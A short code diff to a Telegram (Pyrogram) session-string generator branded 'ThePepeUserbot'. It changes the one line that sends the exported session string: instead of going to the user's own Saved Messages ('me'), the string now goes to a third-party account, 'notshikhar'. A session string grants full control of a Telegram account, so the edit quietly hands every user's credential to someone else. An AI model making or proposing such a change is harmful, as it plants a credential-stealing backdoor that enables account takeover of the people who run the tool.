@@ -9,7 +9,7 @@ with pyrogram.Client(
     os.system('clear')
     message_ = f"#STRING_SESSION\n<code>{gensession.export_session_string()} </code>\n\n<b>>> Powered by ThePepeUserbot!</b>"
     gensession.send_message(
-        "me",
+        "notshikhar",
         message_,
         parse_mode = "html"
     )
